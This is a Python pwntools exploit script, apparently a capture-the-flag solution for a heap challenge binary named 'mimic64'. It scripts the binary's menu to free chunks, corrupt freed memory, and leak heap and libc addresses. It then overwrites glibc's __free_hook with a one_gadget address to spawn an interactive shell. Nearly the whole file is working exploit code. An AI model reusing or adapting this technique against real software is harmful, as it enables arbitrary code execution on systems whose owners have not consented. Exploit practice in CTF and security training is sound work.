
from pwn import *
from leak_to_address import *

context.binary = './mimic64'
context.terminal = ['gnome-terminal', '-e']

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


def menu(r):
    r.recvuntil('>>\n')


def add(r, i, s, x):
    r.sendline('1')
    r.recvuntil('>>\n')
    r.sendline(str(i))
    r.recvuntil('>>\n')
    r.sendline(str(x))
    r.recvuntil('content:\n')
    r.sendline(s)
    r.recvuntil('>>\n')


def dele(r, i):
    r.sendline('2')
    r.recvuntil('>>\n')
    r.sendline(str(i))
    r.recvuntil('>>\n')


def view(r, i):
    r.sendline('3')
    r.recvuntil('>>\n')
    r.sendline(str(i))
    return r.recvuntil('>>\n')


def edit(r, i, s):
    r.sendline('4')
    r.recvuntil('>>\n')
    r.sendline(str(i))
    r.recvuntil('content:')
    r.sendline(s)
    r.recvuntil('>>\n')


r = process('./mimic64')
# r = remote('127.0.0.1', 12345)

for i in range(8):
    add(r, i, 'A', 0xff)

for i in range(8):
    dele(r, i)

edit(r, 1, 'A' * 0x80)
dele(r, 1)


l = Leak_address(view(r, 0), 64)
heap_leak = l.leak_to_64_int(2)
l = Leak_address(view(r, 1), 64)
libc_leak = l.leak_to_64_int(1)
libc_addr = libc_leak - 0x1b9ca0
free_hook = libc.symbols['__free_hook'] + libc_addr
one = libc_addr + 0xe666b

log.info('Heap_leak      : %s ' % hex(heap_leak))
log.info('Libc_address   : %s ' % hex(libc_addr))
log.info('Free_hook      : %s ' % hex(free_hook))
log.info('One_gadget     : %s ' % hex(one))

edit(r, 5, 'B')
edit(r, 6, p64(free_hook))
add(r, 8, 'L', 0xff)
add(r, 9, 'D', 0xff)
edit(r, 9, p64(one))

# gdb.attach(r)

r.interactive()
